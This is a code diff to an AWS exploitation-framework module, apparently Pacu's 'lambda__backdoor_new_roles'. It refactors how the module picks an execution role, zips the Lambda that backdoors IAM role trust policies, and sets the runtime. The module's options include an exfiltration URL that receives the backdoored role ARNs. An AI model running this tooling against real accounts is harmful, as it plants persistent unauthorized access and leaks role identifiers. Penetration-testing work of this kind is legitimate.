@@ -5,10 +5,10 @@ from pathlib import Path
 from copy import deepcopy
 import random
 import string
-import zipfile
 import os
 
-from pacu.core.lib import session_dir, module_data_dir
+from pacu.core.lib import module_data_dir
+from pacu.utils import zip_file
 
 module_info = {
     'name': 'lambda__backdoor_new_roles',
@@ -27,13 +27,14 @@ module_info = {
 
     'external_dependencies': [],
 
-    'arguments_to_autocomplete': ['--arn', '--exfil-url', '--cleanup'],
+    'arguments_to_autocomplete': ['--arn', '--exfil-url','--role-arn', '--cleanup'],
 }
 
 parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
 
 parser.add_argument('--arn', required=False, default=None, help='The ARN of your own IAM user or role that you want to add to the assume role policy document.')
 parser.add_argument('--exfil-url', required=False, default=None, help='The URL to POST backdoored roles\' ARNs to, so you can assume them.')
+parser.add_argument('--role-arn', required=False, default=None, help='The role should allow Lambda to assume it and have at least the IAM UpdateAssumeRolePolicy and GetRole permissions')
 parser.add_argument('--cleanup', required=False, default=False, action='store_true', help='Run the module in cleanup mode. This will remove any known backdoors that the module added from the account.')
 
 
@@ -132,21 +133,24 @@ def main(args, pacu_main):
     data = {'functions_created': 0, 'rules_created': 0, 'successes': 0}
 
     created_resources = {'LambdaFunctions': [], 'CWERules': []}
+    
+    if not args.role_arn:
+        target_role_arn = input('  What role should be used? Note: The role should allow Lambda to assume it and have at '
+                                'least the IAM UpdateAssumeRolePolicy and GetRole permissions. Enter the ARN now or just '
+                                'press enter to enumerate a list of possible roles to choose from: ')
+        if not target_role_arn:
+            if fetch_data(['IAM', 'Roles'], module_info['prerequisite_modules'][0], '--roles', force=True) is False:
+                print('Pre-req module not run successfully. Exiting...')
+                return None
+            roles = deepcopy(session.IAM['Roles'])
 
-    target_role_arn = input('  What role should be used? Note: The role should allow Lambda to assume it and have at '
-                            'least the IAM UpdateAssumeRolePolicy and GetRole permissions. Enter the ARN now or just '
-                            'press enter to enumerate a list of possible roles to choose from: ')
-    if not target_role_arn:
-        if fetch_data(['IAM', 'Roles'], module_info['prerequisite_modules'][0], '--roles', force=True) is False:
-            print('Pre-req module not run successfully. Exiting...')
-            return None
-        roles = deepcopy(session.IAM['Roles'])
-
-        print('Found {} roles. Choose one below.'.format(len(roles)))
-        for i in range(0, len(roles)):
-            print('  [{}] {}'.format(i, roles[i]['RoleName']))
-        choice = input('Choose an option: ')
-        target_role_arn = roles[int(choice)]['Arn']
+            print('Found {} roles. Choose one below.'.format(len(roles)))
+            for i in range(0, len(roles)):
+                print('  [{}] {}'.format(i, roles[i]['RoleName']))
+            choice = input('Choose an option: ')
+            target_role_arn = roles[int(choice)]['Arn']
+    else:
+        target_role_arn=args.role_arn
 
     # Import the Lambda function and modify the variables it needs
     with open(MODULE_PATH/'lambda_function.py.bak', 'r') as f:
@@ -157,14 +161,11 @@ def main(args, pacu_main):
     # Zip the Lambda function
     try:
         print('  Zipping the Lambda function...\n')
-        with zipfile.ZipFile(LAMBDA_FUNCTION_ZIP_PATH, 'w', zipfile.ZIP_DEFLATED) as zip_file:
-            zip_file.writestr('lambda_function.py', source_code)
+        zip_data = {'lambda_function.py': source_code}
+        zip_file_bytes = zip_file(LAMBDA_FUNCTION_ZIP_PATH, zip_data)
     except Exception as error:
         print('Failed to zip the Lambda function locally: {}\n'.format(error))
         return data
-
-    with open(LAMBDA_FUNCTION_ZIP_PATH, 'rb') as f:
-        zip_file_bytes = f.read()
 
     client = pacu_main.get_boto3_client('lambda', 'us-east-1')
 
@@ -172,7 +173,7 @@ def main(args, pacu_main):
         function_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(15))
         response = client.create_function(
             FunctionName=function_name,
-            Runtime='python3.6',
+            Runtime='python3.9',
             Role=target_role_arn,
             Handler='lambda_function.lambda_handler',
             Code={
